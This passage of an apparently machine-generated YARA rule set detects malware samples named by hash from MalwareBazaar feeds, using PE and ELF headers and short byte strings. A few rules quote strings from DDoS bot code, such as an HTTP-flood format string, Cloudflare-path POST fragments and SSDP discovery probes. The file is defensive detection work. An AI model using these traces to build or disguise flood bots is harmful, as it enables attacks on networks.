        and all of them
}

rule Windows_35a0972ce46d230c9d81041386f11c361f799591fcc278ec9f11d5140aa5389a
{
    meta:
        description = "Auto ML: 35a0972ce46d230c9d81041386f11c361f799591fcc278ec9f11d5140aa5389a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "kQRich"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".pdata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1062KB
        and all of them
}

rule Linux_35eeba173fb481ac30c40c1659ccc129eae2d4d922e27cf071047698e8d95aea
{
    meta:
        description = "Auto ML: 35eeba173fb481ac30c40c1659ccc129eae2d4d922e27cf071047698e8d95aea"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/lib64/ld-linux-x86-64.so.2"
        $s2 = "libdl.so.2"
        $s3 = "_ITM_deregisterTMCloneTable"
        $s4 = "__gmon_start__"
        $s5 = "_Jv_RegisterClasses"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 6199KB
        and all of them
}

rule Windows_35f53c5cca6b39903694aff2fa966bce4165c79ea707c54200096d5756a3ef05
{
    meta:
        description = "Auto ML: 35f53c5cca6b39903694aff2fa966bce4165c79ea707c54200096d5756a3ef05"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich<>"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".didat"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2369KB
        and all of them
}

rule Windows_361b415e122170dbfa20900a87c66ee32bcb918e45cdc7c6f6da99e132400f75
{
    meta:
        description = "Auto ML: 361b415e122170dbfa20900a87c66ee32bcb918e45cdc7c6f6da99e132400f75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "CompilationRelaxationsAttribute"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 337KB
        and all of them
}

rule Linux_368c28595de00b23f1aca7531a898b5ad6f4e3f333f70a21b934e952aa3bc265
{
    meta:
        description = "Auto ML: 368c28595de00b23f1aca7531a898b5ad6f4e3f333f70a21b934e952aa3bc265"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PTRhf0@"
        $s2 = "7Rwp|l"
        $s3 = "@Qjow{{"
        $s4 = "U<CRND?|"
        $s5 = "U3dg\\u|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_36b6d1ea82820b0b1675694e3b78bd3e9de13b63e499dcc938fdac27302e57f8
{
    meta:
        description = "Auto ML: 36b6d1ea82820b0b1675694e3b78bd3e9de13b63e499dcc938fdac27302e57f8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "+ff .H+qa}W"
        $s5 = "W/a MY"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 924KB
        and all of them
}

rule Linux_36cf30394dc0ad898487a17fd80bd82c80405035e677c4d4c02389fe5278fc4d
{
    meta:
        description = "Auto ML: 36cf30394dc0ad898487a17fd80bd82c80405035e677c4d4c02389fe5278fc4d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "Cookie:"
        $s4 = "[http flood] headers: \"%s\""
        $s5 = "/sbin/"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 147KB
        and all of them
}

rule Linux_36d4cde4137379c1466f523436d2783acce3bed0bffe3bf4551148601f46ffa0
{
    meta:
        description = "Auto ML: 36d4cde4137379c1466f523436d2783acce3bed0bffe3bf4551148601f46ffa0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "#3a qR!a"
        $s2 = "b4r3a q"
        $s3 = "b4r3a,q"
        $s4 = "c4s2a1R"
        $s5 = "#3a qb!q"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 110KB
        and all of them
}

rule Linux_046172aef784acc02417bb6894bd20990032f1c48e1eaece77251f79c1c6245f
{
    meta:
        description = "Auto ML: 046172aef784acc02417bb6894bd20990032f1c48e1eaece77251f79c1c6245f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HcD$TH"
        $s2 = "HcD$0H"
        $s3 = "HcD$TA"
        $s4 = "X[]A\\A]A^A_"
        $s5 = "HcD$dH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB
        and all of them
}

rule Linux_36ebbaf82ea51df4f9aa88e2c697afc15ff08ca7e00ad35eb21f7a63db829dbc
{
    meta:
        description = "Auto ML: 36ebbaf82ea51df4f9aa88e2c697afc15ff08ca7e00ad35eb21f7a63db829dbc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 139KB
        and all of them
}

rule Windows_36ec44ea896af1e6cf3bd5282b0cc6147a4955d85ee507230bf6fb4fe0adb4e6
{
    meta:
        description = "Auto ML: 36ec44ea896af1e6cf3bd5282b0cc6147a4955d85ee507230bf6fb4fe0adb4e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 321KB
        and all of them
}

rule Windows_3726fd2adc46647baeedba9144d1fa6e0634c08f55f183fcf4c5e67c763b446a
{
    meta:
        description = "Auto ML: 3726fd2adc46647baeedba9144d1fa6e0634c08f55f183fcf4c5e67c763b446a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1905KB
        and all of them
}

rule Linux_373fecd47d71a993800e6c5186b32e8b4828f0fa282a9e89617d1fa8b71b9681
{
    meta:
        description = "Auto ML: 373fecd47d71a993800e6c5186b32e8b4828f0fa282a9e89617d1fa8b71b9681"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`y4WP~j"
        $s2 = ".A\\qvsS"
        $s3 = "Q1COVO"
        $s4 = ":dDsr["
        $s5 = "!gU$If"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Android_3745e0fb7edbdd8da57f44f5ee1d2b2cc0db5d7f8b63ea69ce12ce561402cf17
{
    meta:
        description = "Auto ML: 3745e0fb7edbdd8da57f44f5ee1d2b2cc0db5d7f8b63ea69ce12ce561402cf17"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "UaT4r|"
        $s3 = "sU{M>[j"
        $s4 = "uoZ<g&"
        $s5 = "bI_E,I"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 57642KB
        and all of them
}

rule Linux_377387c0630eb3bf62d70fc3ac7f99b885aad594ba3e603bb7a47bea2ae6e6b9
{
    meta:
        description = "Auto ML: 377387c0630eb3bf62d70fc3ac7f99b885aad594ba3e603bb7a47bea2ae6e6b9"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "0NQj%m"
        $s2 = "$uMyQe"
        $s3 = ";e2MhdDNlJ"
        $s4 = "n$PH.Hw"
        $s5 = "pd[t$As"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Linux_37767c30c4a4a87d6de191c1815621f3537de1688c726a6a55a6119346df816b
{
    meta:
        description = "Auto ML: 37767c30c4a4a87d6de191c1815621f3537de1688c726a6a55a6119346df816b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "P(B);@US("
        $s2 = "`uitSq"
        $s3 = "<PGH@pp"
        $s4 = "WY?8W\\!a"
        $s5 = "d6jwV8"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 66KB
        and all of them
}

rule Android_3779e67d696ba3ef4ba4b38ba10e07301620a45f1d89f004da5ae64f050dfdb4
{
    meta:
        description = "Auto ML: 3779e67d696ba3ef4ba4b38ba10e07301620a45f1d89f004da5ae64f050dfdb4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "AndroidManifest.xml"
        $s2 = "versionCode"
        $s3 = "debuggable"
        $s4 = "extractNativeLibs"
        $s5 = "usesCleartextTraffic"

    condition:
        uint32(0) == 0x04034b50 and
        filesize < 1100KB
        and all of them
}

rule Linux_377f50912720f49016ce3a2dd00d4df3b372d6bfffad12570670f68c5a1952f7
{
    meta:
        description = "Auto ML: 377f50912720f49016ce3a2dd00d4df3b372d6bfffad12570670f68c5a1952f7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
        $s3 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
        $s4 = "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36"
        $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 113KB
        and all of them
}

rule Windows_37a1bf9b3ac3853e6a7d70c2bd7050f88117378c63d8e94c0cf7d4fd8ad67396
{
    meta:
        description = "Auto ML: 37a1bf9b3ac3853e6a7d70c2bd7050f88117378c63d8e94c0cf7d4fd8ad67396"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "`.rsrc"
        $s2 = "VCL_STYLE 2.0x"
        $s3 = ">dC7\\'PE"
        $s4 = "bXdDD,:"
        $s5 = "cj__yb"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1916KB
        and all of them
}

rule Windows_0468edab9934f19752cf9245b77b97e351063df4a54fd7cb214e533f703125ca
{
    meta:
        description = "Auto ML: 0468edab9934f19752cf9245b77b97e351063df4a54fd7cb214e533f703125ca"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "6Y 'etBa}"
        $s5 = "`f gxW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 96KB
        and all of them
}

rule Linux_37d21137f581d3e7cc8708b18d21cb0c18f2c823c898d5d7ade5f7688ff19a81
{
    meta:
        description = "Auto ML: 37d21137f581d3e7cc8708b18d21cb0c18f2c823c898d5d7ade5f7688ff19a81"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "HEAD /"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 91KB
        and all of them
}

rule Windows_37edd92328e327016c691f2e0a5f83fc4ba03e0f6bc35bf7217cfe816590f2f3
{
    meta:
        description = "Auto ML: 37edd92328e327016c691f2e0a5f83fc4ba03e0f6bc35bf7217cfe816590f2f3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = ";E$rjw"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1474KB
        and all of them
}

rule Linux_380b12f89099b7a7e0c05dc14f9db96064b48572c64a9fc03e6b688ae4cd05d4
{
    meta:
        description = "Auto ML: 380b12f89099b7a7e0c05dc14f9db96064b48572c64a9fc03e6b688ae4cd05d4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "}k>p}iXP"
        $s2 = "}J>p}GPP"
        $s3 = "}k>p}hXP"
        $s4 = "}J>p}IPP~i"
        $s5 = "KxTi@.|"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 150KB
        and all of them
}

rule Windows_381c756fce09818f4f9390daa00dd827d1431a59e9357a06fa0d9faca797367e
{
    meta:
        description = "Auto ML: 381c756fce09818f4f9390daa00dd827d1431a59e9357a06fa0d9faca797367e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "RichlY"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB
        and all of them
}

rule Windows_3830e8249b95e86065288cb7a00ee9139d9e2fd918ff9c7e427e8684c1481579
{
    meta:
        description = "Auto ML: 3830e8249b95e86065288cb7a00ee9139d9e2fd918ff9c7e427e8684c1481579"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "Boolean"
        $s3 = "SmNlInt"
        $s4 = "Curr@cy"
        $s5 = "TObject"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1555KB
        and all of them
}

rule Windows_3853ba6c0896ef753801c44ec14a40eaf930c29fc53ba9fc7a2ea32559b4fa93
{
    meta:
        description = "Auto ML: 3853ba6c0896ef753801c44ec14a40eaf930c29fc53ba9fc7a2ea32559b4fa93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 384KB
        and all of them
}

rule Windows_387304b50852736281a29d00ed2d8cdb3368d171215f1099b41c404e7e099193
{
    meta:
        description = "Auto ML: 387304b50852736281a29d00ed2d8cdb3368d171215f1099b41c404e7e099193"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = ".gfids"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1552KB
        and all of them
}

rule Linux_38efe69f9db4ba93e17980885545a274023b1240b90d9ee9ec08fa162de4e31c
{
    meta:
        description = "Auto ML: 38efe69f9db4ba93e17980885545a274023b1240b90d9ee9ec08fa162de4e31c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 162KB
        and all of them
}

rule Linux_38f457068ed16163c697e47ae7b48aea52374d96655cbf2eee68c6f89c80b8be
{
    meta:
        description = "Auto ML: 38f457068ed16163c697e47ae7b48aea52374d96655cbf2eee68c6f89c80b8be"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Rq>-QP"
        $s2 = "{MJF$E"
        $s3 = "\"mC$I7Bj"
        $s4 = ".yfO9Hq"
        $s5 = "1d=vDH"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 27KB
        and all of them
}

rule Linux_3913c6bd123cc72db0d4ceab2523ba93d9fc130faf438bc0c124078cfe25ddaa
{
    meta:
        description = "Auto ML: 3913c6bd123cc72db0d4ceab2523ba93d9fc130faf438bc0c124078cfe25ddaa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "|<UPX!d"
        $s2 = "IXRWT1"
        $s3 = "VR\\~xy"
        $s4 = "xa!Rt)u"
        $s5 = "|T4oMm"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 33KB
        and all of them
}

rule Linux_0046342a57cfdc865eacd99b3fa62d4f6365ddc3392677b730f96eadb0a497e6
{
    meta:
        description = "Auto ML: 0046342a57cfdc865eacd99b3fa62d4f6365ddc3392677b730f96eadb0a497e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "P$ny|I`"
        $s2 = "]w-hWv"
        $s3 = "bFZvgk'"
        $s4 = "mv}3TL"
        $s5 = "F5O=bA"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 1550KB
        and all of them
}

rule Linux_046956dedb920f7c30fce31c7e0f9f5f92f9e5b2f438586256b2aee489141a0a
{
    meta:
        description = "Auto ML: 046956dedb920f7c30fce31c7e0f9f5f92f9e5b2f438586256b2aee489141a0a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "ff4Jfg"
        $s2 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "HOST: 255.255.255.255:1900"
        $s5 = "MAN: \"ssdp:discover\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 189KB
        and all of them
}

rule Windows_395dff94e3b067deaa8bf4ccaeff47ea6171b325b9d065838cca45ea78f2b2e6
{
    meta:
        description = "Auto ML: 395dff94e3b067deaa8bf4ccaeff47ea6171b325b9d065838cca45ea78f2b2e6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode.$"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "uKHcQ<"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2536KB
        and all of them
}

rule Windows_396a6b2f82a81fc2009611d69541bc39c7184dff470726e2b583575e593e649a
{
    meta:
        description = "Auto ML: 396a6b2f82a81fc2009611d69541bc39c7184dff470726e2b583575e593e649a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = ";!wuUrwuUrwuUr<"
        $s3 = "QsuuUr<"
        $s4 = "SsvuUr<"
        $s5 = "TsxuUrwuTr"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 679KB
        and all of them
}

rule Windows_39a8c585d60201261bad7600af0f3840fcb174fec63263ebf55020e4dedc157c
{
    meta:
        description = "Auto ML: 39a8c585d60201261bad7600af0f3840fcb174fec63263ebf55020e4dedc157c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "WWjdh,"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1554KB
        and all of them
}

rule Windows_39ee34923fc77f5cacd1210dd87e95c101cfb53b947de24da39f82152afa0f4c
{
    meta:
        description = "Auto ML: 39ee34923fc77f5cacd1210dd87e95c101cfb53b947de24da39f82152afa0f4c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Them_Click_1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 747KB
        and all of them
}

rule Linux_3a3688ea5e176a4a0027053ccafa1f3d17b245561342320ebda50eebb0856998
{
    meta:
        description = "Auto ML: 3a3688ea5e176a4a0027053ccafa1f3d17b245561342320ebda50eebb0856998"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "FEAZS,"
        $s2 = "Ngda`>a"
        $s3 = "zZwiE2"
        $s4 = "\\EXIU{2|"
        $s5 = "Dh?nr\"u0"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 45KB
        and all of them
}

rule Windows_3ac3d3fd3244a1520c0116c7ab762fbfc38a5cbeb7fa31c457208623834ca3f1
{
    meta:
        description = "Auto ML: 3ac3d3fd3244a1520c0116c7ab762fbfc38a5cbeb7fa31c457208623834ca3f1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "tabPage1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 708KB
        and all of them
}

rule Windows_3ac6dde9c9dfcaed7066ea5af5121fd75a7c6c1ab9bb7bb4ca35784d50efa202
{
    meta:
        description = "Auto ML: 3ac6dde9c9dfcaed7066ea5af5121fd75a7c6c1ab9bb7bb4ca35784d50efa202"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "B.V7gC"
        $s5 = "fffff."

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 661KB
        and all of them
}

rule Windows_3ae8d263abd33819980c81f1e0b6b876f06e5747807459e82a47fd518767358e
{
    meta:
        description = "Auto ML: 3ae8d263abd33819980c81f1e0b6b876f06e5747807459e82a47fd518767358e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Action`10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 102KB
        and all of them
}

rule Linux_3afbef3a92b102f9b0e728f84a2636922406f1575a336e9ba313c1756a065aa7
{
    meta:
        description = "Auto ML: 3afbef3a92b102f9b0e728f84a2636922406f1575a336e9ba313c1756a065aa7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "{C7DwC"
        $s4 = "k7GKnt"
        $s5 = "Vw`Tsh"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB
        and all of them
}

rule Windows_3b20d2b68fa07bffa05fb0c61332ef5dbdd5aae247471d7c9a98e753b4a00a8e
{
    meta:
        description = "Auto ML: 3b20d2b68fa07bffa05fb0c61332ef5dbdd5aae247471d7c9a98e753b4a00a8e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4754KB
        and all of them
}

rule Windows_0473f031c92c25f207f6fc08f9e2bfc92b142e5dfcbf63b635a90de49342ba70
{
    meta:
        description = "Auto ML: 0473f031c92c25f207f6fc08f9e2bfc92b142e5dfcbf63b635a90de49342ba70"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "b /|LDa}"
        $s5 = "D%S qC"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 811KB
        and all of them
}

rule Windows_3b28b6404fda828b7d9e9ea3c375fa4b14837a52ca341c71fb183b58c3f0cb09
{
    meta:
        description = "Auto ML: 3b28b6404fda828b7d9e9ea3c375fa4b14837a52ca341c71fb183b58c3f0cb09"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "Kingdom"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 434KB
        and all of them
}

rule Windows_3ba4a1da7a6ffee3728964d71358824b4648959b55b61c450b4a0267b7006ed6
{
    meta:
        description = "Auto ML: 3ba4a1da7a6ffee3728964d71358824b4648959b55b61c450b4a0267b7006ed6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".xetus"
        $s5 = "_VVVVV"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 344KB
        and all of them
}

rule Windows_3bccd5cdf61005f1008359d1fbf6bd705994189ddb234bdd25dc433866aa1f1f
{
    meta:
        description = "Auto ML: 3bccd5cdf61005f1008359d1fbf6bd705994189ddb234bdd25dc433866aa1f1f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "button10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 946KB
        and all of them
}

rule Windows_3c1a1e54203b5274bf12d78645769e36f82c671adfbdd455362d4d0c1792c91e
{
    meta:
        description = "Auto ML: 3c1a1e54203b5274bf12d78645769e36f82c671adfbdd455362d4d0c1792c91e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.rsrc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 13041KB
        and all of them
}

rule Windows_3c21c1067f2f7fd008b20dda0422e4b50f679aadf5e91817889f58d759282f1d
{
    meta:
        description = "Auto ML: 3c21c1067f2f7fd008b20dda0422e4b50f679aadf5e91817889f58d759282f1d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4754KB
        and all of them
}

rule Windows_3c816780d6733c7798f6348b2f3fa6be5bd0ac8413615280a5be3a89d8c64588
{
    meta:
